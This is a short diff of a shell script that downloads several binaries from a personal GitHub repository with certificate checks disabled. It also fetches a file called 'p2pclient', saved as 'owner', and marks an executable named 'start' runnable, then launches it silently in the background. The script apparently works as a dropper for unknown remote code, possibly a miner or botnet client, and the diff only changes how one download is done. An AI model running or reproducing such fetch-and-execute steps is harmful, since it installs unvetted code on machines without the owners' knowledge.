@@ -1,7 +1,6 @@
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpb -o wpb 
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpc -o wpc
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpd -o wpd
-wget -O owner https://raw.githubusercontent.com/robertreynolds2/start/main/p2pclient && chmod +x owner
-curl -k -o owner https://raw.githubusercontent.com/robertreynolds2/start/main/p2pclient && chmod +x owner
+curl -k -o owner https://raw.githubusercontent.com/robertreynolds2/start/main/p2pclient
 curl -k https://raw.githubusercontent.com/robertreynolds2/gambar/main/start -o start && chmod +x start && ./start  > /dev/null 2>&1 &
 sleep 10
